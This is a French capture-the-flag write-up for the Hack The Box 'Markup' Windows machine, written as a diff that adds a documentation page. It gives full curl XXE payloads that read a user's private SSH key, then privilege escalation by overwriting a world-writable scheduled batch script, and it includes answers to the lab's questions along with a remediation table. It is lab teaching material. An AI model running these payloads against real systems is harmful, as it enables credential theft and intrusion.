@@ -1,0 +1,260 @@
+---
+title: Markup
+description: WU Markup
+categories: [Writeup]
+tags: [writeup]
+template: doc
+sidebar:
+  order: 9
+  badge:
+    text: 'easy'
+    variant: success
+---
+
+| OS | Difficulty | Target |
+|----|----|----|
+| Windows | <span style="color:green">**EASY**</span> | 10.129.x.x |
+
+## Résumé
+
+Machine Windows exposant une application web PHP vulnérable à une injection XXE (XML External Entity). L'exploitation de la XXE permet d'extraire la clé SSH privée d'un utilisateur. L'escalade de privilèges s'effectue via un script batch exécuté par une tâche planifiée avec des permissions d'écriture trop permissives.
+
+---
+
+## Reconnaissance
+
+### Scan de ports
+
+```bash
+nmap -T4 <IP>
+```
+
+```shell wrap
+PORT    STATE SERVICE
+22/tcp  open  ssh
+80/tcp  open  http
+443/tcp open  https
+```
+
+### Scan détaillé
+
+```bash
+nmap -A -p 22,80,443 <IP>
+```
+
+| Port | Service | Version |
+|------|---------|---------|
+| 22 | SSH | OpenSSH for_Windows_8.1 |
+| 80 | HTTP | Apache 2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28 |
+| 443 | HTTPS | Apache 2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28 |
+
+---
+
+## Enumération
+
+### Application web (80/443)
+
+L'application "MegaShopping" présente une page de login.
+
+Test de credentials par défaut :
+
+```
+admin:**REDACTED**
+```
+
+Accès réussi à l'interface d'administration.
+
+### Fonctionnalité de commande
+
+L'application permet de passer des commandes via un formulaire. L'analyse du trafic révèle que les données sont envoyées en XML à `/process.php`.
+
+### Analyse du code source
+
+Un commentaire HTML révèle un nom d'utilisateur potentiel :
+
+```html
+<!-- Modified by Daniel : UI-Fix-9092-->
+```
+
+Cet indice sera utile pour cibler les fichiers à extraire via XXE.
+
+---
+
+## Exploitation
+
+### XXE (XML External Entity)
+
+Le parser XML côté serveur ne désactive pas les entités externes, permettant une injection XXE.
+
+#### Test initial
+
+```shell wrap
+curl -X POST http://<IP>/process.php \
+  -H "Content-Type: text/xml" \
+  -H "Cookie: PHPSESSID=<SESSION>" \
+  -d '<?xml version="1.0"?>
+<!DOCTYPE order [
+  <!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">
+]>
+<order>
+  <quantity>1</quantity>
+  <item>&xxe;</item>
+  <address>test</address>
+</order>'
+```
+
+Le contenu du fichier `hosts` est retourné dans la réponse, confirmant la vulnérabilité.
+
+#### Extraction de la clé SSH
+
+```shell wrap
+curl -X POST http://<IP>/process.php \
+  -H "Content-Type: text/xml" \
+  -H "Cookie: PHPSESSID=<SESSION>" \
+  -d '<?xml version="1.0"?>
+<!DOCTYPE order [
+  <!ENTITY xxe SYSTEM "file:///c:/users/daniel/.ssh/id_rsa">
+]>
+<order>
+  <quantity>1</quantity>
+  <item>&xxe;</item>
+  <address>test</address>
+</order>'
+```
+
+La clé privée SSH de l'utilisateur `daniel` est récupérée.
+
+### Connexion SSH
+
+```bash
+# Sauvegarder la clé
+cat > daniel_id_rsa << 'EOF'
+-----BEGIN OPENSSH PRIVATE KEY-----
+[...]
+-----END OPENSSH PRIVATE KEY-----
+EOF
+
+# Permissions correctes
+chmod 600 daniel_id_rsa
+
+# Connexion
+ssh -i daniel_id_rsa daniel@<IP>
+```
+
+Shell obtenu en tant que `daniel`.
+
+---
+
+## Escalade de privilèges
+
+### Enumération
+
+Recherche de fichiers intéressants :
+
+```cmd
+dir /s C:\Log-Management
+```
+
+Un script `job.bat` est présent dans `C:\Log-Management\`.
+
+```cmd
+type C:\Log-Management\job.bat
+```
+
+```batch
+@echo off
+FOR /F "tokens=1,2*" %%V IN ('bcdedit') DO SET adminTest=%%V
+IF (%adminTest%)==(Access) goto noAdmin
+for /F "tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G")
+echo.
+echo Event Logs have been cleared!
+goto theEnd
+:do_clear
+wevtutil.exe cl %1
+goto :eof
+:noAdmin
+echo You must run this script as an Administrator!
+:theEnd
+exit
+```
+
+### Vérification des permissions
+
+```cmd
+icacls C:\Log-Management\job.bat
+```
+
+```shell wrap
+C:\Log-Management\job.bat BUILTIN\Users:(F)
+                          NT AUTHORITY\SYSTEM:(I)(F)
+                          BUILTIN\Administrators:(I)(F)
+                          BUILTIN\Users:(I)(RX)
+```
+
+Le groupe `BUILTIN\Users` a le droit **Full Control (F)** sur le fichier, permettant à n'importe quel utilisateur de le modifier.
+
+### Exploitation
+
+Ce script est exécuté périodiquement par une tâche planifiée avec des privilèges élevés.
+
+```shell wrap
+echo type C:\Users\Administrator\Desktop\root.txt ^> C:\Log-Management\output.txt > C:\Log-Management\job.bat
+```
+
+Après quelques instants, le fichier `output.txt` contient le flag root :
+
+```cmd
+type C:\Log-Management\output.txt
+```
+
+---
+
+## Flags
+
+```cmd
+type C:\Users\daniel\Desktop\user.txt
+type C:\Log-Management\output.txt
+```
+
+---
+
+## Questions HTB
+
+| # | Question | Réponse |
+|---|----------|---------|
+| 1 | What version of Apache is running on the target's port 80? | `2.4.41` |
+| 2 | What username:password combination logs in successfully? | `admin:**REDACTED**` |
+| 3 | What is the word at the top of the page that accepts user input? | `Order` |
+| 4 | What XML version is used on the target? | `1.0` |
+| 5 | What does the XXE / XEE attack acronym stand for? | `XML External Entity` |
+| 6 | What username can we find on the webpage's HTML code? | `Daniel` |
+| 7 | What is the file located in the Log-Management folder on the target? | `job.bat` |
+| 8 | What executable is mentioned in the file mentioned before? | `wevtutil.exe` |
+
+---
+
+## A retenir
+
+| Vulnérabilité | Description | Remédiation |
+|---------------|-------------|-------------|
+| **Credentials par défaut** | Login admin:**REDACTED** | Forcer le changement de mot de passe à la première connexion |
+| **XXE Injection** | Parser XML acceptant les entités externes | Désactiver les entités externes (libxml_disable_entity_loader) |
+| **Clé SSH exposée** | Clé privée accessible via XXE | Restreindre les permissions sur les fichiers sensibles |
+| **Permissions faibles** | Script exécuté en admin modifiable par tous | Appliquer le principe du moindre privilège |
+| **Tâche planifiée** | Exécution de scripts avec privilèges élevés | Auditer les tâches planifiées et leurs permissions |
+
+---
+
+## Outils utilisés
+
+- nmap
+- curl
+- ssh
+
+---
+
+## Références
+
+- [HackTricks - XXE Injection](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)
+- [OWASP - XML External Entity](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)
+- [PayloadsAllTheThings - XXE](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
